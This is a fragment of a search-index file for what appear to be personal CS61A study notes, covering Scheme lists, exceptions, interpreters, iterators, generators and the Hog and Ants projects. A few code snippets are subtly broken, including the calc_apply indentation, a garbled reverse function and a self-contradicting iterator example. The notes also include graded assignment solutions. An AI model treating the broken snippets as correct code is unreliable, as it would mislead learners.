4)\n(car (cdr one-through-four))\n2\n(cons 10 one-through-four)\n(10 1 2 3 4)\n</code></pre> <pre><code>scm&gt; (list 1 2 3)\n(1 2 3)\nscm&gt; (list 1 (list 2 3) 4)\n(1 (2 3) 4)\nscm&gt; (list (cons 1 (cons 2 nil)) 3 4)\n((1 2) 3 4)\n</code></pre> </p>"},{"location":"cs61a%20notes/chap3/#built-in_procedures_for_lists","title":"Built-In Procedures for Lists","text":"<p>Using <code>null?</code> predicate, we can define the standard sequence operations for computing length and selecting elements: <pre><code>(define (length items)\n    (if (null? items)\n        0\n        (+ 1 (length (cdr items)))))\n(define (getitem items n)\n    (if (= n 0)\n        (car items)\n        (getitem (cdr items) (- n 1))))\n</code></pre> <pre><code>scm&gt; (null? nil)                ; Checks if a value is the empty list\nTrue\nscm&gt; (append '(1 2 3) '(4 5 6)) ; Concatenates two lists\n(1 2 3 4 5 6)\nscm&gt; (length '(1 2 3 4 5))      ; Returns the number of elements in a list\n5\n</code></pre></p>"},{"location":"cs61a%20notes/chap3/#symbolic_data","title":"Symbolic Data","text":"<p>In Scheme, any expression that is not evaluated is said to be quoted use single quotation mark <code>'</code> <pre><code>(define a 1)\n(define b 2)\n(list a b)\n(1 2)\n(list 'a 'b)\n(a b)\n</code></pre></p> <p>Quotation can be applied to combinations to form lists: <pre><code>(car '(a b c))\na\n</code></pre></p>"},{"location":"cs61a%20notes/chap3/#turtle_graphics","title":"Turtle graphics","text":"<p>the turtle has a position and heading on the canvas Single-argument procedures such as forward and right change the position and heading of the turtle.</p> <p>recursive drawings</p> <p>Sierpinski's triangle <pre><code>&gt; (define (repeat k fn)\n    (if (&gt; k 0)\n        (begin (fn) \n        (repeat (- k 1) fn))\n        nil))\n&gt; (define (tri fn)\n    (repeat 3 (lambda () (fn) (lt 120))))\n&gt; (define (sier d k)\n    (tri (lambda ()\n    (if (= k 1) (fd d) (leg d k)))))\n&gt; (define (leg d k)\n    (sier (/ d 2) (- k 1))\n    (penup)\n    (fd d)\n    (pendown))\n</code></pre></p>"},{"location":"cs61a%20notes/chap3/#33_exceptions","title":"3.3 Exceptions  <p>Error examples abound:  a function may not receive arguments that it is designed to accept,  a necessary resource may be missing a connection across a network may be lost.</p> <p>no single correct approach to handling errors - Programs designed to provide some persistent service like a web server should be robust to errors, - Python interpreter handles errors by terminating immediately</p> <p>Raising an exception is a technique for interrupting the normal flow of execution in a program, signaling that some exceptional circumstance has arisen, and returning directly to an enclosing part of the program that was designated to react to that circumstance.</p> <p>An exception is a object instance with a class that inherits from the BaseException class.  The <code>assert</code> statement raises an exception with the class AssertionError.  In general, any exception instance can be raised with the <code>raise</code> statement</p> <p><pre><code>&gt;&gt;&gt; raise Exception('An error occurred')\nTraceback (most recent call last):\nFile \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nException: an error occurred\n</code></pre> the file name <code>&lt;stdin&gt;</code> indicates that the exception was raised by the user in an interactive session, rather than from code in a file.</p> <p>Handling exceptions <code>try</code> statement <pre><code>try:\n    &lt;try suite&gt;\nexcept &lt;exception class&gt; as &lt;name&gt;:\n    &lt;except suite&gt;\n</code></pre> the identifier <code>&lt;name&gt;</code> is bound to the exception object that was raised, but this binding does not persist beyond the <code>&lt;except suite&gt;</code>.</p> <p>A try statement will handle exceptions that occur within the body of a function that is applied (either directly or indirectly) within the <code>&lt;try suite&gt;</code>.  When an exception is raised, control jumps directly to the body of the <code>&lt;except suite&gt;</code> of the most recent try statement that handles that type of exception. <pre><code>&gt;&gt;&gt; def invert(x):\n        result = 1/x # Raises a ZeroDivisionError if x is 0\n        print('Never printed if x is 0')\n        return result\n&gt;&gt;&gt; def invert_safe(x):\n        try:\n            return invert(x)\n        except ZeroDivisionError as e:\n            return str(e)\n&gt;&gt;&gt; invert_safe(2)\nNever printed if x is 0\n0.5\n&gt;&gt;&gt; invert_safe(0)\n'division by zero'\n</code></pre></p>","text":""},{"location":"cs61a%20notes/chap3/#exception_objects","title":"Exception Objects","text":"<p>Exception objects themselves can have attributes such as the error message stated in an assert statement and information about where in the course of execution the exception was raised.</p> <p>find the zero of \\(2x^2 + \\sqrt{x}\\)</p> <p>returns the best guess discovered in the course of iterative improvement whenever a <code>ValueError</code> occurs <pre><code>&gt;&gt;&gt; class IterImproveError(Exception):  # User-defined exception classes\n        def __init__(self, last_guess):\n            self.last_guess = last_guess\n&gt;&gt;&gt; def improve(update, done, guess=1, max_updates=1000):\n        k = 0\n        try:\n            while not done(guess) and k &lt; max_updates:\n                guess = update(guess)   # A math domain error (a type of ValueError) is raised when sqrt is applied to a negative number.\n                k = k + 1\n            return guess\n        except ValueError:\n            raise IterImproveError(guess)\n&gt;&gt;&gt; def find_zero(f, guess=1):\n        def done(x):\n            return f(x) == 0\n        try:\n            return improve(newton_update(f), done, guess)\n        except IterImproveError as e:\n            return e.last_guess\n&gt;&gt;&gt; from math import sqrt\n&gt;&gt;&gt; find_zero(lambda x: 2*x*x + sqrt(x))\n-0.030211203830201594\n</code></pre></p> <p>separate the logic for iterative improvement, which appears unchanged in the suite of the try clause, from the logic for handling errors, which appears in except clauses.</p>"},{"location":"cs61a%20notes/chap3/#34_interpreters_for_languages_with_combination","title":"3.4 Interpreters for Languages with Combination  <p>Metalinguistic abstraction : establishing new languages</p> <p>An interpreter for a programming language is a function that - applied to an expression of the language - performs the actions required to evaluate that expression.</p>","text":""},{"location":"cs61a%20notes/chap3/#parsing_expressions","title":"Parsing Expressions","text":"<p>Parsing is the process of generating expression trees from raw text input parser\uff1a - Lexical analysis partitions the input string into tokens, which are the minimal syntactic units of the language such as names and symbols.</p> <ul> <li>Syntactic analysis constructs an expression tree from this sequence of tokens</li> </ul>"},{"location":"cs61a%20notes/chap3/#calculator_evaluation","title":"Calculator Evaluation","text":"<p><pre><code>def calc_eval(exp):\n    \"\"\"Evaluate a Calculator expression.\"\"\"\n    if type(exp) in (int, float):\n        return simplify(exp)\n    elif isinstance(exp, Pair):\n        arguments = exp.second.map(calc_eval)\n        return simplify(calc_apply(exp.first, arguments))\n    else:\n        raise TypeError(exp + ' is not a number or call expression')\n</code></pre> <pre><code>def calc_apply(operator, args):\n    \"\"\"Apply the named operator to a list of args.\"\"\"\n    if not isinstance(operator, str):\n        raise TypeError(str(operator) + ' is not a symbol')\n    if operator == '+':\n        return reduce(add, args, 0)\n    elif operator == '-':\n        if len(args) == 0:\n        raise TypeError(operator + ' requires at least 1 argument')\n        elif len(args) == 1:\n        return -args.first\n        else:\n        return reduce(sub, args.second, args.first)\n    elif operator == '*':\n        return reduce(mul, args, 1)\n    elif operator == '/':\n        if len(args) == 0:\n        raise TypeError(operator + ' requires at least 1 argument')\n        elif len(args) == 1:\n        return 1/args.first\n        else:\n        return reduce(truediv, args.second, args.first)\n    else:\n    raise TypeError(operator + ' is an unknown operator')\n</code></pre></p> <p>Read-eval-print loops interacting with an interpreter <pre><code>def read_eval_print_loop():\n    \"\"\"Run a read-eval-print loop for calculator.\"\"\"\n    while True:\n        try:\n            src = buffer_input()\n            while src.more_on_line:\n            expression = scheme_read(src)\n            print(calc_eval(expression))\n        except (SyntaxError, TypeError, ValueError, ZeroDivisionError) as err:\n            print(type(err).__name__ + ':', err)\n        except (KeyboardInterrupt, EOFError): # &lt;Control&gt;-D, etc.\n            print('Calculation completed.')\n            return\n</code></pre> - parsing function - evaluation function - exception types handling</p>"},{"location":"cs61a%20notes/chap3/#interpreters_for_languages_with_abstraction","title":"Interpreters for Languages with Abstraction","text":""},{"location":"cs61a%20notes/chap3/#data_as_programs","title":"Data as Programs","text":"<p>programs are data expressions are lists - From the perspective of the user, an input expression such as (+ 2 2) is an expression in the programming language, which the interpreter should evaluate.  - From the perspective of the Scheme interpreter, the expression is simply a sentence of words that is to be manipulated according to a well-defined set of rules.</p>"},{"location":"cs61a%20notes/chap3/#define_code_1_2_eval_code","title":"<pre><code>(define code '(+ 1 2))\n(eval code) \n</code></pre>","text":""},{"location":"cs61a%20notes/chap3/#tail_calls","title":"Tail Calls  <p>A function call f(x) is a tail call if: - It is the \u200b\u200bfinal operation\u200b\u200b in the function (i.e., no operations depend on its result). - The return value of f(x) is \u200b\u200bdirectly returned\u200b\u200b by the caller, no furthur computation.</p> <p>A tail call is a call expression in a tail context:  - The last body sub-expression in a lambda expression (or procedure definition)  - Sub-expressions 2 &amp; 3 in a tail context <code>if</code> expression  - All non-predicate sub-expressions in a tail context <code>cond</code>  - The last sub-expression in a tail context <code>and</code>, <code>or</code>, <code>begin</code>, or <code>let</code> </p> <p>A Scheme interpreter should support an unbounded number of active (not yet returned) tail calls using only a constant amount of space.</p> <p>A recursive procedure is tail recursive if all of its recursive calls are tail calls</p> <p>Linear recursive procedures can often be re-written to use tail calls <pre><code>def fact_k(n, k): \n    if n == 0: \n        return k \n    else: \n        return fact_k(n - 1, n*k)\ndef fact_k(n, k): \n    while n &gt; 0: \n            n, k = n - 1, k * n \n    return k\n</code></pre></p> <p>use extra parameter to keep track of progress so far</p>  <p>map</p>  <p>iter: <pre><code>(define (map procedure s) \n  (if (null? s)  \n        nil  \n      (cons (procedure (car s))  \n            (map \n    procedure (cdr s))) ) )\n</code></pre> tail call: <pre><code>(define (map procedure s) \n  (define (map-reverse s m) \n    (if (null? s)  \n        m \n        (map-reverse (cdr s) \n                     (cons \n                        (procedure (car s))  \n                        m))               ) ) \n  (reverse (map-reverse s nil))) \n\n(define (reverse s) \n  (define (reverse-iter s r) \n    (if (null? s)  \n        r \n        (reverse-iter (cdr s) \n                      (cons \n                        (reverse-iter s nil))\n                        (car s) r)) ) ) \n</code></pre></p>","text":""},{"location":"cs61a%20notes/chap4/","title":"Chap4","text":""},{"location":"cs61a%20notes/chap4/#data_processing","title":"Data Processing","text":""},{"location":"cs61a%20notes/chap4/#42_implicit_sequences","title":"4.2 Implicit Sequences <p>A sequence can be represented without each element being stored explicitly in the memory of the computer. That is, we can construct an object that provides access to all of the elements of some sequential dataset without computing the value of each element in advance. Instead, we compute elements on demand.</p> <p>the range container when an element is requested from a range, it is computed on demand Hence, we can represent very large ranges of integers without using large blocks of memory.  Only the end points of the range are stored as part of the range object. <pre><code>&gt;&gt;&gt; r = range(10000, 1000000000)\n&gt;&gt;&gt; r[45006230]\n45016230    #adds the first element 10,000 to the index 45,006,230 to produce the element 45,016,230\n</code></pre> Computing values on demand, rather than retrieving them from an existing representation, is an example of lazy computation.</p>","text":""},{"location":"cs61a%20notes/chap4/#iterators","title":"Iterators","text":"<p>a unified way to process elements of a container value sequentially</p> <p>The iterator abstraction has two components:  - retrieving the next element in the sequence being processed and  - signaling that the end of the sequence has been reached and no further elements remain</p> <p>An iterator maintains local state to represent its position in a sequence. <pre><code>&gt;&gt;&gt; iterator = iter([1,2,3])\n&gt;&gt;&gt; type(iterator)\n&lt;class 'list_iterator'&gt;\n\n&gt;&gt;&gt; r = range(1, 3)\n&gt;&gt;&gt; iter1 = iter(r)\n&gt;&gt;&gt; type(iter1)\n&lt;class 'range_iterator'&gt;\n\n&gt;&gt;&gt; iter2 = iter(r)     # another iterator object\n&gt;&gt;&gt; iter3 = iter2       # the same iterator object\n&gt;&gt;&gt; iter4 = iter(iter3) # the same iterator\n# Calling iter on an iterator will return *that* iterator, *not a copy*\n\n&gt;&gt;&gt; next(iter1)\n1\n&gt;&gt;&gt; list(iter1)\n[2]\n&gt;&gt;&gt; next(iter1)\n2\n&gt;&gt;&gt; list(iter1)\n[]\n&gt;&gt;&gt; next(iter1)\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nStopIteration\n\n&gt;&gt;&gt; next(iter2)\n1\n</code></pre> \u26a0\ufe0fside effect <pre><code>&gt;&gt;&gt; iter = iter([1, 2, 3])\n&gt;&gt;&gt; next(iter) == next(iter)\nFalse\n</code></pre></p>"},{"location":"cs61a%20notes/chap4/#iterables","title":"Iterables","text":"<p>Any value that can produce iterators is called an iterable value. - Containers such as lists, strings, tuples, sets, dictionaries and range - Iterators are also iterables, because they can be passed to the iter function.</p> <p>unordered collections such as dictionaries must define an ordering over their contents when they produce iterators</p> <ul> <li>If a key is added or removed, then all iterators become invalid. </li> <li>changing the value of an existing key does not change the order of the contents.</li> </ul>"},{"location":"cs61a%20notes/chap4/#built-in_iterators","title":"Built-in Iterators","text":"<p>Several built-in functions take as arguments iterable values and return iterators.  <code>map</code>, <code>filter</code>, <code>zip</code>, <code>reversed</code> These functions are used extensively for lazy sequence processing.</p> <p><pre><code>&gt;&gt;&gt; m = map(lambda x: x * x, [3, 4, 5])\n&gt;&gt;&gt; next(m)\n9\n&gt;&gt;&gt; next(m)\n16\n&gt;&gt;&gt; f = filter(lambda x: x &gt; 3, [3, 4, 5])\n&gt;&gt;&gt; next(f)\n4\n&gt;&gt;&gt; next(f)\n5\n&gt;&gt;&gt; z = zip([30, 40, 50], [3, 4, 5])\n&gt;&gt;&gt; next(z)\n(30, 3)\n&gt;&gt;&gt; next(z)\n(40, 4)\n</code></pre> more about <code>zip</code>: <pre><code>&gt;&gt;&gt; list(zip([1, 2, 3], [4, 5], [6, 7, 8]))\n[(1, 4), (2, 5)]\n</code></pre></p>"},{"location":"cs61a%20notes/chap4/#for_statements","title":"For Statements","text":"<p>Objects are iterable (an interface) if they have an <code>__iter__</code> method that returns an iterator an iterator have an <code>__iter__</code> method that returns the iterator itself, so that all iterators are iterable. <pre><code>for &lt;name&gt; in &lt;expression&gt;:\n    &lt;suite&gt;\n</code></pre> To execute a for statement 1. evaluates the header <code>&lt;expression&gt;</code>, which must yield an iterable value. The <code>__iter__</code> method is invoked on that value.  2. Until a StopIteration exception is raised, Python repeatedly     1. invokes the<code>__next__</code> method on that iterator and binds the result to the <code>&lt;name&gt;</code> in the for statement.     2. executes the <code>&lt;suite&gt;</code>.</p>"},{"location":"cs61a%20notes/chap4/#adventages_of_iterators","title":"Adventages of Iterators","text":"<ul> <li>make few assumptions on the data itself</li> <li>bundle the sequence and the position toghther</li> </ul>"},{"location":"cs61a%20notes/chap4/#generators","title":"Generators","text":"<p><pre><code>def letters_generator():\n    current = 'a'       # initial\n    while current &lt;= 'd':   # end condition\n        yield current       # content\n        current = chr(ord(current)+1)   # next\n</code></pre> When called, a generator function doesn't return a particular yielded value, but instead a generator (which is a type of iterator) that itself can return the yielded values.</p> <ul> <li>start executing the body statements of its generator function when the first time <code>__next__</code> is invoked. </li> <li>raises a StopIteration exception whenever its generator function returns.</li> </ul> <p><code>yiel from</code> statements yields all values from an iterator or iterable  <pre><code>&gt;&gt;&gt; def a_then_b(a, b):\n        yield from a\n        yield from b\n&gt;&gt;&gt; list(a_then_b([1, 2], [3, 4]))\n[1, 2, 3, 4]\n</code></pre> equivalent to: <pre><code>&gt;&gt;&gt; def a_then_b(a, b):\n        for x in a:\n            yield x\n        for x in b:\n            yield x\n</code></pre> recursion:</p> <p>partition</p> <p><pre><code>def partition(n, m):\n    if n &gt; 0 and m &gt; 0:\n        if n == m:\n            yield str(m)\n        for p in partition(n - m, m):   # need extra computation -&gt; for statement\n            yield p + str(m)    \n        yield from partition(n, m - 1)  # yield directly --&gt; yield from statement\n</code></pre> for base case n &lt; 0 and m &lt; 0, there is nothing to yield, so no need to write</p> <p>Compared to return a whole list, we just think about yield a single element</p>"},{"location":"cs61a%20notes/chap4/#iterable_interface","title":"Iterable Interface","text":"<p>The built-in <code>iter</code> function invokes the <code>__iter__</code> method on its argument <code>next</code> (or equivalently, each invocation of <code>__next__</code>)</p> <pre><code>&gt;&gt;&gt; class Letters:\n        def __init__(self, start='a', end='e'):\n            self.start = start\n            self.end = end\n        def __iter__(self):\n            return LetterIter(self.start, self.end)\n&gt;&gt;&gt; b_to_k = Letters('b', 'k')\n&gt;&gt;&gt; first_iterator = b_to_k.__iter__()\n&gt;&gt;&gt; next(first_iterator)\n'b'\n&gt;&gt;&gt; next(first_iterator)\n'c'\n&gt;&gt;&gt; second_iterator = iter(b_to_k)\n&gt;&gt;&gt; second_iterator.__next__()\n'b'\n&gt;&gt;&gt; first_iterator.__next__()\n'd'\n&gt;&gt;&gt; first_iterator.__next__()\n'e'\n&gt;&gt;&gt; second_iterator.__next__()\n'c'\n&gt;&gt;&gt; second_iterator.__next__()\n'd'\n</code></pre>"},{"location":"cs61a%20notes/chap4/#creating_iterables_with_yield","title":"Creating Iterables with Yield","text":"<pre><code>&gt;&gt;&gt; def all_pairs(s):       # iterate over elements multiple times, using multiple iterators\n        for item1 in s:\n            for item2 in s:\n                yield (item1, item2)\n&gt;&gt;&gt; list(all_pairs([1, 2, 3]))\n[(1, 1), (1, 2), (1, 3), (2, 1), (2, 2), (2, 3), (3, 1), (3, 2), (3, 3)]\n\n&gt;&gt;&gt; class LettersWithYield:\n        def __init__(self, start='a', end='e'):\n            self.start = start\n            self.end = end\n        def __iter__(self):\n            next_letter = self.start\n            while next_letter &lt; self.end:\n                yield next_letter\n                next_letter = chr(ord(next_letter)+1)   \n\n&gt;&gt;&gt; letters = LettersWithYield()\n&gt;&gt;&gt; list(all_pairs(letters))[:5]\n[('a', 'a'), ('a', 'b'), ('a', 'c'), ('a', 'd'), ('b', 'a')]\n</code></pre>"},{"location":"cs61a%20notes/chap4/#iterator_interface","title":"Iterator Interface","text":"<p><pre><code>class LetterIter:\n    \"\"\"An iterator over letters of the alphabet in ASCII order.\"\"\"\n    def __init__(self, start='a', end='e'):\n        self.next_letter = start\n        self.end = end\n    def __next__(self):\n        if self.next_letter == self.end:\n            raise StopIteration     #  signals that the end of an underlying series has been reached\n        letter = self.next_letter\n        self.next_letter = chr(ord(letter)+1)       # change nonlocal value --&gt; keep a local state\n        return letter\n</code></pre> Typically, an iterator is not reset; instead a new instance is created to start a new iteration.</p> <p>iterates over the infinite series, never raises a StopIteration exception <pre><code>class Positives:\n    def __init__(self):\n        self.next_positive = 1\n    def __next__(self):\n        result = self.next_positive\n        self.next_positive += 1\n        return result\n</code></pre></p>"},{"location":"cs61a%20notes/chap4/#python_streams","title":"Python Streams","text":"<p>A stream is a lazily computed linked list.</p>"},{"location":"cs61a%20notes/hog/","title":"Hog","text":""},{"location":"cs61a%20notes/hog/#hog","title":"Hog","text":""},{"location":"cs61a%20notes/hog/#dice","title":"Dice","text":""},{"location":"cs61a%20notes/hog/#make","title":"make","text":"<p><pre><code>def make_fair_dice(sides):\n    \"\"\"Return a die that returns 1 to SIDES with equal chance.\"\"\"\n    assert type(sides) == int and sides &gt;= 1, 'Illegal value for sides'\n    def dice():\n        return randint(1,sides)\n    return dice\n\nfour_sided = make_fair_dice(4)\nsix_sided = make_fair_dice(6)\n</code></pre> to bind name to function: - def  - assignment (<code>=</code>)</p>"},{"location":"cs61a%20notes/hog/#test","title":"test","text":"<p><pre><code>&gt;&gt;&gt; counted_dice = make_test_dice(4, 1, 2, 6)\n&gt;&gt;&gt; roll_dice(3, counted_dice)\n? 1\n-- OK! --\n\n&gt;&gt;&gt; # Make sure you call dice exactly num_rolls times!\n&gt;&gt;&gt; # If you call it fewer or more than that, it won't be at the right spot in the cycle for the next roll\n&gt;&gt;&gt; # Note that a return statement within a loop ends the loop\n&gt;&gt;&gt; roll_dice(1, counted_dice)\n? 4\n-- Not quite. Try again! --\n\n? 6\n-- OK! --\n</code></pre> the same object!!!</p>"},{"location":"cs61a%20notes/hog/#hog_1","title":"Hog","text":""},{"location":"cs61a%20notes/hog/#overall","title":"Overall","text":"<p>understand!!! - the game rule &amp; logic (psuedocode) - job of function    - input &amp; output   - by specific &amp; all types of cases - control flow (never repeat) - higher-order functions     <pre><code>def f(x)\n    def g(y)\n        return... # taking x &amp; y\n    return g\n</code></pre>     separate defining and calling    - defining: equivalent to function(x, y), just to change the signature   - calling:     x: directly pass to f     y: from the caller-function of f</p>"},{"location":"cs61a%20notes/hog/#is_always_roll","title":"is_always_roll","text":"<p><pre><code>def is_always_roll(strategy, goal=GOAL):\n    first_roll = strategy(0, 0)\n    for i in range(goal):\n        for j in range(goal):\n            curr_roll = strategy(i, j)\n            if(curr_roll != first_roll):\n                return False\n    return True\n</code></pre> wrong: <pre><code>if strategy in [always_roll(n) for n in range(11)]:\n        return True \n    else:\n        return False\n</code></pre> Every time <code>always_roll</code> is called, a new function object will be returned, even if the passed parameter <code>n</code> are the same</p>"},{"location":"cs61a%20notes/hog/#make_averaged","title":"make_averaged","text":"<pre><code>def make_averaged(original_function, times_called=1000):\n    \"\"\"Return a function that returns the average value of ORIGINAL_FUNCTION\n    called TIMES_CALLED times.\n\n    &gt;&gt;&gt; dice = make_test_dice(4, 2, 5, 1)\n    &gt;&gt;&gt; averaged_dice = make_averaged(roll_dice, 40)\n    &gt;&gt;&gt; averaged_dice(1, dice)  # The avg of 10 4's, 10 2's, 10 5's, and 10 1's\n    3.0\n    \"\"\"\n    def averaged(*args):\n        total = 0\n        for i in range(times_called):\n            sample = original_function(*args)\n            total += sample\n        return total / times_called\n    return averaged\n</code></pre> <p>*args syntax**</p>"},{"location":"cs61a%20notes/oop/","title":"Oop","text":"<p><code>super()</code>   call ancestors <pre><code>class Shape:\n    \"\"\"All geometric shapes will inherit from this Shape class.\"\"\"\n    def __init__(self, name):\n        self.name = name\n\n    def area(self):\n        \"\"\"Returns the area of a shape\"\"\"\n        print(\"Override this method in \", type(self))\n\n    def perimeter(self):\n        \"\"\"Returns the perimeter of a shape\"\"\"\n        print(\"Override this function in \", type(self))\n\nclass Circle(Shape):\n    \"\"\"A circle is characterized by its radii\"\"\"\n    def __init__(self, name, radius):\n        super().__init__(name)\n        self.radius = radius\n\n    def perimeter(self):\n        \"\"\"Returns the perimeter of a circle (2\u03c0r)\"\"\"\n        return 2*pi*self.radius\n\n    def area(self):\n        \"\"\"Returns the area of a circle (\u03c0r^2)\"\"\"\n        return pi*self.radius**2\n\nclass RegPolygon(Shape):\n    \"\"\"A regular polygon is defined as a shape whose angles and side lengths are all the same.\n    This means the perimeter is easy to calculate. The area can also be done, but it's more inconvenient.\"\"\"\n    def __init__(self, name, num_sides, side_length):\n        super().__init__(name)\n        self.num_sides = num_sides\n        self.side_length = side_length\n\n    def perimeter(self):\n        \"\"\"Returns the perimeter of a regular polygon (the number of sides multiplied by side length)\"\"\"\n        return self.num_sides*self.side_length\nclass Square(RegPolygon):\n    def __init__(self, name, side_length):\n        super().__init__(name, 4, side_length)\n\n    def area(self):\n        \"\"\"Returns the area of a square (squared side length)\"\"\"\n        return self.side_length**2\n\nclass Triangle(RegPolygon):\n    \"\"\"An equilateral triangle\"\"\"\n    def __init__(self, name, side_length):\n        super().__init__(name, 3, side_length)\n\n    def area(self):\n        \"\"\"Returns the area of an equilateral triangle is (squared side length multiplied by the provided constant\"\"\"\n        constant = math.sqrt(3)/4\n        return constant*self.side_length**2\n</code></pre></p> <p>from <code>ants</code> <pre><code>class FireAnt(Ant):\n    \"\"\"FireAnt cooks any Bee in its Place when it expires.\"\"\"\n\n    name = 'Fire'\n    damage = 3\n    food_cost = 5\n    implemented = True \n\n    def __init__(self, health=3):\n        \"\"\"Create an Ant with a HEALTH quantity.\"\"\"\n        super().__init__(health)\n\n    def reduce_health(self, amount):\n        \"\"\"Reduce health by AMOUNT, and remove the FireAnt from its place if it\n        has no health remaining.\n\n        Make sure to reduce the health of each bee in the current place, and apply\n        the additional damage if the fire ant dies.\n        \"\"\"\n        # BEGIN Problem 5\n        \"*** YOUR CODE HERE ***\"\n        place = self.place\n        bees = place.bees[:]\n        Ant.reduce_health(self, amount)\n        fire = amount + self.damage if self.health &lt;= 0 else amount\n        for b in bees:\n            b.reduce_health(fire)\n        # place.bees = bees         wrong!!!\n</code></pre> - why can we change the original object by manipulating a copy?     copy and slice of lists:     Shallow Copy: the same object!!!     </p> <pre><code>![](copy.png)\n</code></pre> <ul> <li>why adding the last line cause error?     you are just changing the attribute of the bees but never removed it from the list     so place.bees = a list of bees whose attribute <code>place</code> may be <code>None</code> (not consistent)</li> </ul> <p>from <code>ants</code> <pre><code>class SlowThrower(ThrowerAnt):\n    \"\"\"ThrowerAnt that causes Slow on Bees.\"\"\"\n\n    name = 'Slow'\n    food_cost = 6\n    # BEGIN Problem EC 1\n    implemented = True   # Change to True to view in the GUI\n    # END Problem EC 1\n\n    def throw_at(self, target):\n        # BEGIN Problem EC 1\n        \"*** YOUR CODE HERE ***\"\n        target.slow_turns = 5\n\n        ori_action = target.action\n        def slow_action(gamestate):\n            if gamestate.time % 2 == 0:\n                ori_action(gamestate)\n            target.slow_turns -= 1\n            if target.slow_turns &lt;= 0:\n                target.action = ori_action\n\n        target.action = slow_action\n        # END Problem EC 1\n</code></pre></p> <p><pre><code>class Coin:\n    cents = None # will be provided by subclasses, but not by Coin itself\n\n    def __init__(self, year):\n        self.year = year\n\n    def worth(self):\n        \"*** YOUR CODE HERE ***\"\n        present_year = Mint().present_year\n        extra = 0\n        if present_year - self.year - 50 &gt; 0:\n            extra = present_year - self.year - 50\n        if self.cents:\n            return self.cents + extra\n\nclass Nickel(Coin):\n    cents = 5\n\nclass Dime(Coin):\n    cents = 10\n</code></pre> \u867d\u7136\u8c03\u7528\u7684\u65b9\u6cd5\u662f\u7ee7\u627f Coin \u7684\uff0c\u4f46\u662f self.cents \u4ecd\u7136\u4ece\u81ea\u5df1\u5f00\u59cb\u627e</p>"},{"location":"cs61a%20notes/small_function.md/iteration/","title":"Iteration","text":""},{"location":"cs61a%20notes/small_function.md/iteration/#while_for","title":"while &amp; for","text":"<p>Damaging a bee may cause it to be removed from its place; when an insect dies, it is removed from its current place. If you iterate over a list, but change the contents of that list at the same time, you may not visit all the elements. This can be prevented by making a copy of the list. You can either use a list slice, or use the built-in list function to make sure the original list is not affected.</p> <p>from <code>ants</code> <pre><code>for b in self.place.bees:\n            b.reduce_health(self.damage)    # cause error since bees may be removed\n</code></pre></p> <pre><code>bees = self.place.bees[:]\nfor b in bees:\n    b.reduce_health(self.damage)\n</code></pre> <p>in <code>ants</code> <pre><code>def nearest_bee(self):\n        \"\"\"Return a random Bee from the nearest Place (excluding the Hive) that contains Bees and is reachable from\n        the ThrowerAnt's Place by following entrances.\n\n        This method returns None if there is no such Bee (or none in range).\n        \"\"\"\n        search_plc = self.place\n        step = 0    # important!!!\n        for step in range(self.lower_bound):\n            search_plc = search_plc.entrance\n        while step &lt; self.upper_bound:\n            if search_plc.is_hive:\n                return \n            if search_plc.bees:\n                return random_bee(search_plc.bees)\n            search_plc = search_plc.entrance\n            step += 1\n</code></pre> \u5982\u679c self.lower_bound \u4e3a 0 \u65f6\uff0cfor \u5faa\u73af\u4e0d\u4f1a\u6267\u884c\uff0c\u90a3\u4e48 step \u53d8\u91cf\u5c31\u4e0d\u4f1a\u88ab\u521b\u5efa\uff0c\u4f46\u5728 while \u5faa\u73af\u4e2d\u4ecd\u7136\u5c1d\u8bd5\u4f7f\u7528\u5b83</p>"},{"location":"cs61a%20notes/small_function.md/iteration/#iterator_generator","title":"iterator &amp; generator","text":"<pre><code>def gen_fib():\n    n, add = 0, 1\n    while True:\n        yield n\n        n, add = n + add, n\n\nnext(filter(lambda n: n &gt; 2024, gen_fib()))\n</code></pre> <p>if parameter contains iterator <pre><code>def differences(t):\n    \"\"\"Yield the differences between adjacent values from iterator t.\n\n    &gt;&gt;&gt; list(differences(iter([5, 2, -100, 103])))\n    [-3, -102, 203]\n    &gt;&gt;&gt; next(differences(iter([39, 100])))\n    61\n    \"\"\"\n    last_x = next(t)\n    for x in t:\n        yield x - last_x\n        last_x = x\n</code></pre></p> <p>recursion -- <code>yield from</code> <pre><code>def primes_gen(n):\n    \"\"\"Generates primes in decreasing order.\n    &gt;&gt;&gt; pg = primes_gen(7)\n    &gt;&gt;&gt; list(pg)\n    [7, 5, 3, 2]\n    \"\"\"\n    if n == 1:\n        return\n    if is_prime(n):\n        yield n\n    yield from primes_gen(n-1)\n</code></pre></p> <pre><code>def partition_gen(n, m):\n    \"\"\"Yield the partitions of n using parts up to size m.\n\n    &gt;&gt;&gt; for partition in sorted(partition_gen(6, 4)):\n    ...     print(partition)\n    1 + 1 + 1 + 1 + 1 + 1\n    1 + 1 + 1 + 1 + 2\n    1 + 1 + 1 + 3\n    1 + 1 + 2 + 2\n    1 + 1 + 4\n    1 + 2 + 3\n    2 + 2 + 2\n    2 + 4\n    3 + 3\n    \"\"\"\n    assert n &gt; 0 and m &gt; 0\n    if n == m:\n        yield str(n)\n    if n - m &gt; 0:\n        for p in partition_gen(n - m, m):\n            yield p + ' + ' + str(m)\n    if m &gt; 1:\n        yield from partition_gen(n, m-1)\n</code></pre> <pre><code>def make_generators_generator(g):\n    \"\"\"Generates all the \"sub\"-generators of the generator returned by\n    the generator function g.\n\n    &gt;&gt;&gt; def every_m_ints_to(n, m):\n    ...     i = 0\n    ...     while (i &lt;= n):\n    ...         yield i\n    ...         i += m\n\n    &gt;&gt;&gt; def every_3_ints_to_10():\n    ...     for item in every_m_ints_to(10, 3):\n    ...         yield item\n\n    &gt;&gt;&gt; for gen in make_generators_generator(every_3_ints_to_10):\n    ...     print(\"Next Generator:\")\n    ...     for item in gen:\n    ...         print(item)\n    Next Generator:\n    0\n    Next Generator:\n    0\n    3\n    Next Generator:\n    0\n    3\n    6\n    Next Generator:\n    0\n    3\n    6\n    9\n    \"\"\"\n    def gener(x):\n        for e in g():\n            yield e\n            if e == x:\n                return\n    for e in g():\n        yield gener(e)\n</code></pre> <p>a clever method to verify if a linked list has a cycle <pre><code>def has_cycle_constant(link):\n    \"\"\"Return whether link contains a cycle.\n\n    &gt;&gt;&gt; s = Link(1, Link(2, Link(3)))\n    &gt;&gt;&gt; s.rest.rest.rest = s\n    &gt;&gt;&gt; has_cycle_constant(s)\n    True\n    &gt;&gt;&gt; t = Link(1, Link(2, Link(3)))\n    &gt;&gt;&gt; 